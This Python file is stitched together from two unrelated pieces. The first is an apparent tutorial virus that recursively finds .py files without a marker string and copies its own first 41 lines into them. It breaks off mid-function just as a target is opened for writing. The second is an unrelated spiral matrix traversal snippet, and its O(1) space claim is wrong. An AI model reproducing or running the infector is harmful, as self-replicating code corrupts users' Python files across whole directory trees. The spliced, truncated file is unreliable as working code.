#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GEEKSFORGEEKS"
  
#search for target files in path
def search(path):  
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
          
        #If it is a folder
        if os.path.isdir(path+"/"+filename):  
            filestoinfect.extend(search(path+"/"+filename)) 
              
        #If it is a python script -> Infect it    
        elif filename[-3:] == ".py":
              
            #default value
            infected = False  
            for line in open(path+"/"+filename): 
                if DATA_TO_INSERT in line: 
                    infected = True
                    break
            if infected == False: 
                filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
  
#changes to be made in the target file 
def infect(filestoinfect): 
    target_file = inspect.currentframe().f_code.co_filename 
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close 
    for fname in filestoinfect: 
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
R = 4
C = 4


def isInBounds(i, j):
    global R
    global C
    if (i < 0 or i >= R or j < 0 or j >= C):
        return False
    return True

# Check if the position is blocked


def isBlocked(matrix, i, j):
    if (not isInBounds(i, j)):
        return True
    if (matrix[i][j] == -1):
        return True

    return False

# DFS code to traverse spirally


def spirallyDFSTravserse(matrix, i, j, Dir, res):
    if (isBlocked(matrix, i, j)):
        return

    allBlocked = True
    for k in range(-1, 2, 2):
        allBlocked = allBlocked and isBlocked(
            matrix, k + i, j) and isBlocked(matrix, i, j + k)

    res.append(matrix[i][j])
    matrix[i][j] = -1
    if (allBlocked):
        return

    # dir: 0 - right, 1 - down, 2 - left, 3 - up
    nxt_i = i
    nxt_j = j
    nxt_dir = Dir
    if (Dir == 0):
        if (not isBlocked(matrix, i, j + 1)):
            nxt_j += 1
        else:
            nxt_dir = 1
            nxt_i += 1

    elif (Dir == 1):
        if (not isBlocked(matrix, i + 1, j)):
            nxt_i += 1
        else:
            nxt_dir = 2
            nxt_j -= 1

    elif (Dir == 2):
        if (not isBlocked(matrix, i, j - 1)):
            nxt_j -= 1
        else:
            nxt_dir = 3
            nxt_i -= 1

    elif (Dir == 3):
        if (not isBlocked(matrix, i - 1, j)):
            nxt_i -= 1
        else:
            nxt_dir = 0
            nxt_j += 1

    spirallyDFSTravserse(matrix, nxt_i, nxt_j, nxt_dir, res)

# To traverse spirally


def spirallyTraverse(matrix):
    res = []
    spirallyDFSTravserse(matrix, 0, 0, 0, res)
    return res


# Driver code
a = [[1, 2, 3, 4], [5, 6, 7, 8], [9, 10, 11, 12], [13, 14, 15, 16]]

# Function Call
res = spirallyTraverse(a)
print(*res)

# This code is contributed by rag2127
# Time Complexity: O(m*n)
# Space Complexity: O(1)
